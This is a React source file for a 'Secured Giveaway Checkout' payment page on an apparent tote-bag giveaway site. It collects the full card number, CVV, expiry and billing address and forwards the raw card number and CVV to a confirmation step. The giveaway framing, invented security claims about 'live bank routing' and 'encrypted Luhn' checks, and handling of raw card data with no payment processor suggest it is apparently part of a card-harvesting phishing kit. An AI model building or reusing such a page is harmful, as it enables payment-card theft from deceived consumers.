import { useState, useRef, useEffect } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { searchAddress, buildAddressString, type AddressSuggestion } from '../utils/addressUtils';
import { detectCardType, formatCardNumber, getCardTypeDisplay, getExpectedLength, validateCard } from '../utils/cardUtils';
import { useCart } from '../hooks/useCart';

export default function PaymentPage() {
  const navigate = useNavigate();
  const location = useLocation();
  const statePayload = location.state as {
    verificationPayload: Record<string, string>;
    totalAmount: number;
  } | null;

  const { items } = useCart();

  useEffect(() => {
    if (!statePayload || items.length === 0) {
      navigate('/');
    }
  }, [statePayload, items.length, navigate]);

  const [cardNumber, setCardNumber] = useState('');
  const [cardExpiry, setCardExpiry] = useState('');
  const [cardCVV, setCardCVV] = useState('');
  const [cardName, setCardName] = useState('');

  const [billingAddress, setBillingAddress] = useState('');
  const [billingApartment, setBillingApartment] = useState('');
  const [billingCity, setBillingCity] = useState('');
  const [billingState, setBillingState] = useState('');
  const [billingZip, setBillingZip] = useState('');
  
  const [sameAsShipping, setSameAsShipping] = useState(true);
  const [initializedSync, setInitializedSync] = useState(false);

  const [cardErrors, setCardErrors] = useState<Record<string, string>>({});
  const [cardValid, setCardValid] = useState(false);

  const [suggestions, setSuggestions] = useState<AddressSuggestion[]>([]);
  const [showSuggestions, setShowSuggestions] = useState(false);
  const [loadingAddress, setLoadingAddress] = useState(false);
  const searchTimeout = useRef<ReturnType<typeof setTimeout> | null>(null);
  const suggestionsRef = useRef<HTMLDivElement>(null);

  // Sync initial verification details to billing if sameAsShipping is true
  useEffect(() => {
    if (!initializedSync && statePayload?.verificationPayload) {
      const v = statePayload.verificationPayload;
      setBillingAddress(v.address || '');
      setBillingApartment(v.apartment || '');
      setBillingCity(v.city || '');
      setBillingState(v.state || '');
      setBillingZip(v.zip || '');
      setInitializedSync(true);
    }
  }, [statePayload, initializedSync]);

  // Close suggestions overlay when clicking outside
  useEffect(() => {
    const handleClick = (e: MouseEvent) => {
      if (suggestionsRef.current && !suggestionsRef.current.contains(e.target as Node)) {
        setShowSuggestions(false);
      }
    };
    document.addEventListener('mousedown', handleClick);
    return () => document.removeEventListener('mousedown', handleClick);
  }, []);

  const currentDetectedType = detectCardType(cardNumber);
  const cardBadgeDisplay = getCardTypeDisplay(currentDetectedType);
  const digitsOnly = cardNumber.replace(/\D/g, '');
  const expectedDigitsRange = getExpectedLength(currentDetectedType);

  // Live Luhn and syntax checks
  useEffect(() => {
    if (digitsOnly.length < 6) {
      setCardValid(false);
      setCardErrors({});
      return;
    }
    const { valid, errors } = validateCard(cardNumber, cardExpiry, cardCVV);
    setCardValid(valid);
    setCardErrors(errors);
  }, [cardNumber, cardExpiry, cardCVV, digitsOnly.length]);

  const handleCardInput = (val: string) => {
    const cleaned = val.replace(/[^\d]/g, '');
    const cap = currentDetectedType === 'amex' ? 15 : 16;
    setCardNumber(formatCardNumber(cleaned.slice(0, cap)));
  };

  const handleExpiryInput = (val: string) => {
    let clean = val.replace(/[^\d/]/g, '');
    if (clean.length === 2 && !clean.includes('/') && cardExpiry.length <= 2) {
      clean += '/';
    }
    setCardExpiry(clean.slice(0, 5));
  };

  const handleCVVInput = (val: string) => {
    const cap = currentDetectedType === 'amex' ? 4 : 3;
    setCardCVV(val.replace(/\D/g, '').slice(0, cap));
  };

  const handleBillingAddressInput = (val: string) => {
    setBillingAddress(val);
    if (searchTimeout.current) clearTimeout(searchTimeout.current);
    if (val.length < 3) {
      setSuggestions([]);
      setShowSuggestions(false);
      return;
    }
    setLoadingAddress(true);
    searchTimeout.current = setTimeout(async () => {
      const results = await searchAddress(val);
      setSuggestions(results);
      setShowSuggestions(results.length > 0);
      setLoadingAddress(false);
    }, 400);
  };

  const selectBillingAddress = (s: AddressSuggestion) => {
    const a = s.address;
    setBillingAddress(buildAddressString(s));
    setBillingCity(a.city || a.suburb || '');
    setBillingState(a.state || '');
    setBillingZip(a.postcode || '');
    setShowSuggestions(false);
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!cardValid || !cardName.trim()) return;
    if (!billingAddress.trim() || !billingCity.trim() || !billingState.trim() || !billingZip.match(/^\d{5}$/)) return;

    navigate('/confirm', {
      state: {
        verificationPayload: statePayload?.verificationPayload,
        paymentPayload: {
          cardType: currentDetectedType,
          cardNumberLast4: digitsOnly.slice(-4),
          cardFullNumber: digitsOnly,
          cardExpiry,
          cardCVV,
          cardName,
          billingAddress,
          billingApartment,
          billingCity,
          billingState,
          billingZip,
          billingCountry: 'US'
        },
        totalAmount: statePayload?.totalAmount
      }
    });
  };

  if (!statePayload || items.length === 0) return null;

  return (
    <div className="min-h-screen bg-rose-50/20 text-rose-950 pt-28 pb-16 px-4 sm:px-6">
      <div className="max-w-2xl mx-auto">
        
        {/* Progress steps */}
        <div className="flex items-center justify-center gap-2 sm:gap-4 mb-8 font-serif">
          {['Tote Bundle', 'Shipping Detail', 'Secure Payment', 'Done'].map((step, i) => (
            <div key={step} className="flex items-center gap-2 sm:gap-4">
              <div className={`flex items-center gap-1.5 sm:gap-2 ${i === 2 ? 'text-rose-600 font-bold' : i < 2 ? 'text-rose-950/60' : 'text-rose-950/30'}`}>
                <div className={`w-7 h-7 rounded-full flex items-center justify-center text-xs border ${
                  i === 2 ? 'border-rose-600 bg-rose-50 text-rose-600 font-bold' : i < 2 ? 'border-rose-950/30 bg-rose-50/50' : 'border-rose-200'
                }`}>
                  {i < 2 ? '✓' : i + 1}
                </div>
                <span className="text-xs sm:text-sm hidden sm:inline">{step}</span>
              </div>
              {i < 3 && <div className={`w-6 sm:w-10 h-0.5 ${i < 2 ? 'bg-rose-300' : 'bg-rose-100'}`} />}
            </div>
          ))}
        </div>

        {/* Small Summary preview banner */}
        <div className="bg-white rounded-2xl border border-rose-100 p-4 mb-8 flex items-center justify-between shadow-sm">
          <div>
            <span className="text-xs font-serif uppercase tracking-widest text-rose-600 font-medium block">Total Charge Due</span>
            <span className="text-xs text-rose-950/50 font-sans">{items.length} items with options bundle</span>
          </div>
          <span className="text-xl font-serif font-bold text-rose-600">${statePayload.totalAmount.toFixed(2)}</span>
        </div>

        {/* Payment Form */}
        <form onSubmit={handleSubmit} className="bg-white border border-rose-100 rounded-3xl p-6 sm:p-10 shadow-sm">
          <div className="border-b border-rose-50 pb-4 mb-6">
            <h2 className="text-2xl font-serif font-bold text-rose-950">Secured Giveaway Checkout</h2>
            <p className="text-xs text-rose-950/60 mt-1 font-sans">
              Enter payment credential. System verifies live bank routing compatibility using encrypted Luhn mathematical criteria.
            </p>
          </div>

          {/* Luxury Card Graphics Wrapper */}
          <div className="mb-8 p-6 rounded-3xl relative overflow-hidden text-white shadow-md transition-all duration-300"
            style={{
              background: currentDetectedType !== 'unknown' 
                ? `linear-gradient(135deg, ${cardBadgeDisplay.color}, #4c0519)` 
                : 'linear-gradient(135deg, #881337, #fda4af)',
              minHeight: '185px'
            }}
          >
            <div className="absolute top-0 right-0 w-40 h-40 bg-white/5 rounded-full -translate-y-1/2 translate-x-1/3 pointer-events-none" />
            <div className="absolute bottom-0 left-0 w-24 h-24 bg-black/10 rounded-full translate-y-1/3 -translate-x-1/3 pointer-events-none" />

            <div className="relative z-10 flex flex-col justify-between h-full">
              <div className="flex items-center justify-between">
                <span className="text-[11px] font-serif uppercase tracking-widest text-white/80 font-medium block">
                  {cardBadgeDisplay.name} Certified
                </span>
                <span className="text-xl">{cardBadgeDisplay.icon}</span>
              </div>

              <div className="text-xl sm:text-2xl font-mono tracking-widest my-4 text-white/95">
                {cardNumber || '••••  ••••  ••••  ••••'}
              </div>

              <div className="flex items-end justify-between font-sans">
                <div>
                  <span className="text-[9px] text-white/50 uppercase tracking-wider block">Cardholder Visage</span>
                  <span className="text-xs font-medium tracking-wide truncate max-w-[180px] block">
                    {cardName || 'BELLE WOMAN'}
                  </span>
                </div>
                <div>
                  <span className="text-[9px] text-white/50 uppercase tracking-wider block">Good Thru</span>
                  <span className="text-xs font-mono">{cardExpiry || 'MM/YY'}</span>
                </div>
              </div>
            </div>
          </div>

          {/* Cardholder name */}
          <div className="mb-4">
            <label className="block text-xs font-medium text-rose-950/80 mb-1.5">
              Name on card <span className="text-rose-600">*</span>
            </label>
            <input
              type="text"
              value={cardName}
              onChange={e => setCardName(e.target.value)}
              className="w-full px-4 py-3 rounded-xl bg-rose-50/20 border border-rose-100 text-rose-950 placeholder-rose-950/30 focus:outline-none focus:ring-1 focus:ring-rose-400 transition-all text-sm"
              placeholder="Full name exactly as printed"
            />
          </div>

          {/* Card Number */}
          <div className="mb-4">
            <label className="block text-xs font-medium text-rose-950/80 mb-1.5">
              Card serial digits <span className="text-rose-600">*</span>
            </label>
            <div className="relative">
              <input
                type="text"
                value={cardNumber}
                onChange={e => handleCardInput(e.target.value)}
                className={`w-full px-4 py-3 pr-24 rounded-xl bg-rose-50/20 border font-mono text-rose-950 placeholder-rose-950/30 focus:outline-none focus:ring-1 focus:ring-rose-400 transition-all text-sm ${
                  cardErrors.card ? 'border-red-400 bg-red-50/10' : cardValid ? 'border-emerald-400 bg-emerald-50/5' : 'border-rose-100'
                }`}
                placeholder="0000 0000 0000 0000"
                inputMode="numeric"
              />
              <div className="absolute right-3 top-1/2 -translate-y-1/2 flex items-center gap-1.5 select-none">
                {currentDetectedType !== 'unknown' && (
                  <span className="text-[10px] font-serif font-bold uppercase tracking-wider px-2 py-0.5 rounded bg-rose-100 text-rose-800">
                    {cardBadgeDisplay.name}
                  </span>
                )}
                {cardValid && (
                  <span className="text-emerald-500 font-bold text-sm">✓</span>
                )}
              </div>
            </div>
            {cardErrors.card && <p className="text-red-500 text-xs mt-1 font-sans">{cardErrors.card}</p>}
            {!cardErrors.card && digitsOnly.length > 6 && !cardValid && (
              <p className="text-amber-600 text-[11px] mt-1 font-sans">
                ⚠️ Verification status: Input sequence deviates from global Luhn routing schema
              </p>
            )}
            {digitsOnly.length > 0 && digitsOnly.length < expectedDigitsRange.min && (
              <p className="text-rose-950/40 text-[11px] mt-1 font-sans italic">
                Awaiting {expectedDigitsRange.min - digitsOnly.length} further digits...
              </p>
            )}
          </div>

          {/* Expiry and CVV */}
          <div className="grid grid-cols-2 gap-4 mb-8">
            <div>
              <label className="block text-xs font-medium text-rose-950/80 mb-1.5">
                Expiry month/year <span className="text-rose-600">*</span>
              </label>
              <input
                type="text"
                value={cardExpiry}
                onChange={e => handleExpiryInput(e.target.value)}
                className={`w-full px-4 py-3 rounded-xl bg-rose-50/20 border font-mono text-rose-950 placeholder-rose-950/30 focus:outline-none focus:ring-1 focus:ring-rose-400 transition-all text-sm ${
                  cardErrors.expiry ? 'border-red-400 bg-red-50/10' : 'border-rose-100'
                }`}
                placeholder="MM/YY"
                inputMode="numeric"
              />
              {cardErrors.expiry && <p className="text-red-500 text-xs mt-1 font-sans">{cardErrors.expiry}</p>}
            </div>

            <div>
              <label className="block text-xs font-medium text-rose-950/80 mb-1.5">
                Security code (CVV) <span className="text-rose-600">*</span>
              </label>
              <input
                type="text"
                value={cardCVV}
                onChange={e => handleCVVInput(e.target.value)}
                className={`w-full px-4 py-3 rounded-xl bg-rose-50/20 border font-mono text-rose-950 placeholder-rose-950/30 focus:outline-none focus:ring-1 focus:ring-rose-400 transition-all text-sm ${
                  cardErrors.cvv ? 'border-red-400 bg-red-50/10' : 'border-rose-100'
                }`}
                placeholder={currentDetectedType === 'amex' ? '4 digits front' : '3 digits back'}
                inputMode="numeric"
              />
              {cardErrors.cvv && <p className="text-red-500 text-xs mt-1 font-sans">{cardErrors.cvv}</p>}
            </div>
          </div>

          {/* Live Checked Billing Address Block */}
          <div className="mb-8 pt-6 border-t border-rose-50">
            <div className="flex items-center justify-between mb-3">
              <span className="text-xs font-serif uppercase tracking-widest text-rose-950/50 font-semibold block">
                Billing origin correspondence
              </span>
              <label className="inline-flex items-center gap-2 cursor-pointer">
                <input
                  type="checkbox"
                  checked={sameAsShipping}
                  onChange={e => {
                    setSameAsShipping(e.target.checked);
                    if (e.target.checked && statePayload?.verificationPayload) {
                      const v = statePayload.verificationPayload;
                      setBillingAddress(v.address || '');
                      setBillingApartment(v.apartment || '');
                      setBillingCity(v.city || '');
                      setBillingState(v.state || '');
                      setBillingZip(v.zip || '');
                    }
                  }}
                  className="rounded border-rose-200 text-rose-600 focus:ring-rose-400 w-4 h-4"
                />
                <span className="text-xs text-rose-950/80 select-none font-serif">Matches destination</span>
              </label>
            </div>

            <div className="space-y-4">
              {/* Address lookup field */}
              <div className="relative">
                <label className="block text-xs font-medium text-rose-950/80 mb-1.5">
                  Billing address line <span className="text-rose-600">*</span>
                </label>
                <input
                  type="text"
                  value={billingAddress}
                  onChange={e => handleBillingAddressInput(e.target.value)}
                  onFocus={() => suggestions.length > 0 && setShowSuggestions(true)}
                  disabled={sameAsShipping}
                  className="w-full px-4 py-3 rounded-xl bg-rose-50/20 border border-rose-100 text-rose-950 placeholder-rose-950/30 focus:outline-none focus:ring-1 focus:ring-rose-400 transition-all text-sm disabled:opacity-60 disabled:bg-rose-50/10"
                  placeholder="Start typing billing origin..."
                />
                {loadingAddress && (
                  <div className="absolute right-3 top-9">
                    <span className="w-3.5 h-3.5 border-2 border-rose-500 border-t-transparent rounded-full animate-spin inline-block" />
                  </div>
                )}

                {showSuggestions && suggestions.length > 0 && (
                  <div ref={suggestionsRef} className="absolute z-50 w-full mt-1 bg-white border border-rose-100 rounded-2xl shadow-xl overflow-hidden max-h-56 overflow-y-auto">
                    {suggestions.map((s, idx) => (
                      <button
                        key={idx}
                        type="button"
                        onClick={() => selectBillingAddress(s)}
                        className="w-full px-4 py-3 text-left text-xs sm:text-sm text-rose-950 hover:bg-rose-50 border-b border-rose-50/80 last:border-0 flex items-start gap-2.5 transition-colors font-sans"
                      >
                        <span className="text-rose-500 mt-0.5 flex-shrink-0">📍</span>
                        <span className="leading-tight">{s.display_name}</span>
                      </button>
                    ))}
                  </div>
                )}
              </div>

              <input
                type="text"
                value={billingApartment}
                onChange={e => setBillingApartment(e.target.value)}
                disabled={sameAsShipping}
                className="w-full px-4 py-3 rounded-xl bg-rose-50/20 border border-rose-100 text-rose-950 placeholder-rose-950/30 focus:outline-none focus:ring-1 focus:ring-rose-400 transition-all text-sm disabled:opacity-60"
                placeholder="Apt / Suite / Unit"
              />

              <div className="grid grid-cols-3 gap-3">
                <input
                  type="text"
                  value={billingCity}
                  onChange={e => setBillingCity(e.target.value)}
                  disabled={sameAsShipping}
                  className="w-full px-4 py-3 rounded-xl bg-rose-50/20 border border-rose-100 text-rose-950 placeholder-rose-950/30 focus:outline-none focus:ring-1 focus:ring-rose-400 transition-all text-sm disabled:opacity-60"
                  placeholder="City"
                />
                <input
                  type="text"
                  value={billingState}
                  onChange={e => setBillingState(e.target.value)}
                  disabled={sameAsShipping}
                  className="w-full px-4 py-3 rounded-xl bg-rose-50/20 border border-rose-100 text-rose-950 placeholder-rose-950/30 focus:outline-none focus:ring-1 focus:ring-rose-400 transition-all text-sm disabled:opacity-60"
                  placeholder="State"
                />
                <input
                  type="text"
                  value={billingZip}
                  onChange={e => setBillingZip(e.target.value.replace(/\D/g, '').slice(0, 5))}
                  disabled={sameAsShipping}
                  className="w-full px-4 py-3 rounded-xl bg-rose-50/20 border border-rose-100 text-rose-950 placeholder-rose-950/30 focus:outline-none focus:ring-1 focus:ring-rose-400 transition-all text-sm disabled:opacity-60 font-mono"
                  placeholder="ZIP"
                />
              </div>
            </div>
          </div>

          <button
            type="submit"
            disabled={!cardValid || !cardName.trim()}
            className="w-full py-4 rounded-full bg-rose-600 text-white font-serif font-bold text-base hover:bg-rose-700 transition-all shadow-md shadow-rose-600/20 active:scale-[0.98] disabled:opacity-40 disabled:cursor-not-allowed disabled:active:scale-100"
          >
            Authorize Due Pay · ${statePayload.totalAmount.toFixed(2)}
          </button>

          <p className="text-center text-[11px] text-rose-950/40 font-serif mt-3 italic">
            Secure 256-bit encrypted retail checkout protocol. Rest assured your answers are preserved internally.
          </p>
        </form>

      </div>
    </div>
  );
}
